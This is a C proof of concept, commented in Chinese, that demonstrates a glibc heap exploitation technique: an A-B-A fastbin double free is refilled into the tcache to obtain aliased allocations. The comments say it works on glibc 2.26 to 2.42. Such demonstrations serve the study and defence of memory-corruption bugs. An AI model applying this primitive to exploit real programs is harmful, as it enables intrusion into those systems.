/*
 * 手法：利用 fastbin 双重释放配合 tcache 回填，适用于 glibc 2.26～2.42 / x86-64。
 *
 * 这是 Fastbin Dup 在存在 tcache 时的一种“转存”用法：
 *   1. 先填满 tcache，令 free(A), free(B), free(A) 落入 fastbin；
 *   2. 耗尽 tcache；
 *   3. malloc 从 fastbin 取出第一个 A，同时把剩余 A/B 环 refill 到 tcache；
 *   4. tcache 中出现重复节点，连续申请得到别名指针。
 *
 * 2.32 起 fd 会由 free 自动做 safe-linking；本 PoC 不伪造 fd，所以无需手工
 * 编码。2.42 refill 增加 size 一致性检查，真实 A/B 大小一致，仍可通过。
 * 2.43 删除 fastbin 分配/释放路径，本手法随之失效。
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    void *fillers[7];
    void *a;
    void *b;
    void *guard;
    void *trigger;
    void *from_tcache[3];
    size_t i;

    setbuf(stdout, NULL);

    /* 申请大小 0x18 对应 0x20 chunk，属于 tcache/fastbin。guard 隔开 top。 */
    for (i = 0; i < 7; i++)
        fillers[i] = malloc(0x18);
    a = malloc(0x18);
    b = malloc(0x18);
    guard = malloc(0x18);
    assert(a != NULL && b != NULL && guard != NULL);

    /* 默认每个 tcache bin 最多 7 个；填满后，同尺寸 free 才落到 fastbin。 */
    for (i = 0; i < 7; i++)
        free(fillers[i]);

    /*
     * 漏洞模拟：程序保留悬挂指针，并允许 A-B-A 形式的 double free。
     * fastbin 只拒绝“当前表头再次 free”，中间插入 B 可绕过该检查。
     * 此时 fastbin 逻辑链为 A -> B -> A -> B -> ...。
     */
    free(a);
    free(b);
    free(a);

    /* 先耗尽 tcache；否则 malloc 不会进入 _int_malloc 的 fastbin 分支。 */
    for (i = 0; i < 7; i++)
        fillers[i] = malloc(0x18);

    /*
     * 这一次返回 fastbin 表头 A。_int_malloc 随后循环 REMOVE_FB，最多取
     * tcache_count 个剩余节点并 tcache_put；由于剩余链是 B-A 环，tcache
     * 得到交替重复的 A/B，而 tcache_put 本身不执行 free 时的 key 重复检查。
     */
    trigger = malloc(0x18);
    assert(trigger == a);

    from_tcache[0] = malloc(0x18);
    from_tcache[1] = malloc(0x18);
    from_tcache[2] = malloc(0x18);

    /* tcache 顺序交替，因此第 0、2 次申请必须引用同一个物理 chunk。 */
    assert(from_tcache[0] == from_tcache[2]);
    assert(from_tcache[0] == b);

    puts("[+] fastbin→tcache：重复节点成功");
    (void)guard;
    return 0;
}
